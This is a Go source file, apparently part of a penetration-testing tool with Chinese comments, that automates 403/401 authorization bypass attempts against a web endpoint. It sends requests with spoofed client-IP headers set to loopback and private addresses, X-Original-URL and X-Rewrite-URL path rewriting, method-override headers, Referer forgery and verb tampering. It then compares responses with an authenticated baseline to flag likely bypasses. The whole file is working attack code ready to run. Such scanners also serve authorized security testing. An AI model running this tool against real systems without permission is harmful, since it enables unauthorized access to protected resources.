package lib

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
)

// bypassIPHeaders 用于 IP 伪造的请求头
var bypassIPHeaders = []string{
	"X-Forwarded-For",
	"X-Forward-For",
	"X-Forwarded",
	"X-Forwarded-By",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
	"Forwarded-For",
	"Forwarded",
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-Real-IP",
	"X-True-IP",
	"True-Client-IP",
	"Client-IP",
	"Cluster-Client-IP",
	"X-Client-IP",
	"X-Custom-IP-Authorization",
	"X-ProxyUser-Ip",
	"X-Original-Remote-Addr",
	"CF-Connecting-IP",
	"X-Host",
}

// bypassIPValues 伪造 IP 值
var bypassIPValues = []string{
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"localhost",
	"0.0.0.0",
	"0",
	"10.0.0.1",
	"172.16.0.1",
	"192.168.0.1",
	"192.168.1.1",
}

// bypassPathHeaders 用于路径重写的请求头
var bypassPathHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Override-URL",
}

// methodOverrideHeaders 方法覆盖头
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

// testCase 表示一个测试用例
type testCase struct {
	method  string
	url     string
	headers map[string]string
	desc    string
}

// HeaderBypassStart 使用 HTTP Header 绕过技术进行测试
func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBaseline Baseline) SheetData {
	result := SheetData{
		Name:    "Header/Method 测试",
		Headers: []string{"绕过技术", "URL", "响应长度", "状态码", "判定"},
	}

	fmt.Println(Blue("[+] Header Bypass poc 开始测试"))

	if strings.HasSuffix(url, "/") {
		url = strings.TrimSuffix(url, "/")
	}

	// 先获取原始响应作为基准
	resp, err := HttpClient.Get(url + auth)
	if err != nil {
		fmt.Printf(Red("[-] 请求原始鉴权接口失败: %s\n"), err)
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return result
	}
	origLen := len(body)
	origCode := resp.StatusCode
	fmt.Printf(Green("[+] 原始鉴权接口 %s 的响应: len=%d code=%d\n"), url+auth, origLen, origCode)

	// 构建双基线判定上下文
	ctx := ClassifyContext{
		Auth:   Baseline{Code: origCode, Len: origLen},
		NoAuth: noauthBaseline,
	}

	var cases []testCase

	// 1. IP 伪造 Header 绕过
	for _, header := range bypassIPHeaders {
		for _, ip := range bypassIPValues {
			cases = append(cases, testCase{
				method:  "GET",
				url:     url + auth,
				headers: map[string]string{header: ip},
				desc:    fmt.Sprintf("Header[%s: %s]", header, ip),
			})
		}
	}

	// 2. 路径重写 Header 绕过
	for _, header := range bypassPathHeaders {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + noauth,
			headers: map[string]string{header: auth},
			desc:    fmt.Sprintf("PathRewrite[%s: %s]", header, auth),
		})
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + "/",
			headers: map[string]string{header: auth},
			desc:    fmt.Sprintf("PathRewrite[%s: %s] via /", header, auth),
		})
	}

	// 3. 方法覆盖 Header（通过 GET 请求 + Override 头模拟其他方法）
	for _, header := range methodOverrideHeaders {
		for _, method := range []string{"GET", "POST", "PUT", "PATCH", "DELETE"} {
			cases = append(cases, testCase{
				method:  "GET",
				url:     url + auth,
				headers: map[string]string{header: method},
				desc:    fmt.Sprintf("MethodOverride[%s: %s]", header, method),
			})
		}
	}

	// 4. Referer 伪造
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + auth},
		desc:    "Referer[self]",
	})
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + "/"},
		desc:    "Referer[root]",
	})

	// 5. Content-Length: 0 + POST
	cases = append(cases, testCase{
		method:  "POST",
		url:     url + auth,
		headers: map[string]string{"Content-Length": "0"},
		desc:    "POST+Content-Length:0",
	})

	// 6. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
	methodCases := discoverAndBuildMethodCases(url+auth, origLen, origCode, debug)
	cases = append(cases, methodCases...)

	total := len(cases)
	fmt.Printf(Blue("[+] 共生成 %d 个 Header/Method 测试用例\n"), total)

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, thread)
	mu := &sync.Mutex{}
	var exportData [][]string
	seen := make(map[string]bool)
	var completed int64

	for _, tc := range cases {
		wg.Add(1)
		go func(tc testCase) {
			defer wg.Done()

			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			req, err := http.NewRequest(tc.method, tc.url, bytes.NewBuffer([]byte{}))
			if err != nil {
				return
			}

			for k, v := range tc.headers {
				req.Header.Set(k, v)
			}

			resp, err := HttpClient.Do(req)
			current := atomic.AddInt64(&completed, 1)
			if err != nil {
				if debug == 1 {
					mu.Lock()
					fmt.Printf(Yellow("[!] %s 请求失败 [%d/%d]: %s\n"), tc.desc, current, total, err)
					mu.Unlock()
				}
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}

			// 提取响应元数据
			bodySnippet := truncateBody(body, 4096)
			location := resp.Header.Get("Location")

			newLen := len(body)
			newCode := resp.StatusCode
			classification := ClassifyResult(ctx, newCode, newLen, bodySnippet, location)

			mu.Lock()
			defer mu.Unlock()

			if current%100 == 0 || int(current) == total {
				fmt.Printf(Blue("[*] Header/Method 进度: [%d/%d]\n"), current, total)
			}

			if debug == 1 {
				fmt.Printf(Green("[+] %s: len=%d code=%d → %s\n"), tc.desc, newLen, newCode, classification)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classification,
					})
				}
			} else if (newLen != origLen || newCode != origCode) && newCode != 404 {
				fmt.Printf(Green("[+] %s: len=%d code=%d → %s\n"), tc.desc, newLen, newCode, classification)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classification,
					})
				}
			}
		}(tc)
	}

	wg.Wait()

	result.Data = exportData
	result.TotalPayloads = total
	return result
}

// discoverAndBuildMethodCases 智能探测 HTTP 方法
// 逻辑: GET/POST 已在主流程中测试，这里只做 OPTIONS 探测并按 Allow 头精准生成用例
func discoverAndBuildMethodCases(targetURL string, origLen, origCode, debug int) []testCase {
	var cases []testCase

	// 已知被拦截的状态码（说明 GET/POST 不行，需要探测其他方法）
	blocked := origCode == 401 || origCode == 403 || origCode == 405 || origCode == 302 || origCode == 301

	if !blocked {
		// GET 就能访问，不需要再测其他方法
		if debug == 1 {
			fmt.Printf(Blue("[*] GET 未被拦截 (code=%d)，跳过 HTTP 方法探测\n"), origCode)
		}
		return cases
	}

	fmt.Println(Blue("[+] GET/POST 被拦截，发送 OPTIONS 探测服务端支持的 HTTP 方法..."))

	// 发送 OPTIONS 请求
	req, err := http.NewRequest("OPTIONS", targetURL, nil)
	if err != nil {
		return cases
	}

	resp, err := HttpClient.Do(req)
	if err != nil {
		if debug == 1 {
			fmt.Printf(Yellow("[!] OPTIONS 请求失败: %s\n"), err)
		}
		// OPTIONS 失败，回退测试几个常见方法
		return buildFallbackMethodCases(targetURL)
	}
	defer resp.Body.Close()

	// 解析 Allow 头
	allow := resp.Header.Get("Allow")
	if allow == "" {
		// 有些服务器用 Access-Control-Allow-Methods
		allow = resp.Header.Get("Access-Control-Allow-Methods")
	}

	fmt.Printf(Green("[+] OPTIONS 响应: code=%d, Allow: %s\n"), resp.StatusCode, allow)

	if allow == "" {
		if debug == 1 {
			fmt.Println(Yellow("[!] 服务端未返回 Allow 头，回退测试常见方法"))
		}
		return buildFallbackMethodCases(targetURL)
	}

	// 解析 Allow 头中的方法列表
	allowedMethods := parseAllowHeader(allow)

	// 排除已经测试过的 GET 和 POST，只测试服务端声明支持的其他方法
	skip := map[string]bool{"GET": true, "POST": true, "OPTIONS": true}

	for _, method := range allowedMethods {
		method = strings.TrimSpace(strings.ToUpper(method))
		if skip[method] || method == "" {
			continue
		}
		cases = append(cases, testCase{
			method:  method,
			url:     targetURL,
			headers: nil,
			desc:    fmt.Sprintf("Method[%s] (OPTIONS探测)", method),
		})
	}

	if len(cases) == 0 {
		fmt.Println(Blue("[*] OPTIONS 返回的方法中无额外可测方法"))
	} else {
		fmt.Printf(Blue("[+] 根据 OPTIONS 响应，将测试以下方法: %v\n"), methodNames(cases))
	}

	return cases
}

// buildFallbackMethodCases OPTIONS 不可用时，回退测试少量常见方法
func buildFallbackMethodCases(targetURL string) []testCase {
	// 只测试最有可能产生差异的几个方法，不盲测全部
	fallbackMethods := []string{"PUT", "PATCH", "HEAD"}

	fmt.Printf(Blue("[+] OPTIONS 不可用，回退测试: %v\n"), fallbackMethods)

	var cases []testCase
	for _, method := range fallbackMethods {
		cases = append(cases, testCase{
			method:  method,
			url:     targetURL,
			headers: nil,
			desc:    fmt.Sprintf("Method[%s] (回退探测)", method),
		})
	}
	return cases
}

// parseAllowHeader 解析 Allow 头，支持逗号分隔
func parseAllowHeader(allow string) []string {
	parts := strings.Split(allow, ",")
	var methods []string
	for _, p := range parts {
		m := strings.TrimSpace(p)
		if m != "" {
			methods = append(methods, m)
		}
	}
	return methods
}

// methodNames 从 testCase 列表中提取方法名
func methodNames(cases []testCase) []string {
	var names []string
	for _, c := range cases {
		names = append(names, c.method)
	}
	return names
}
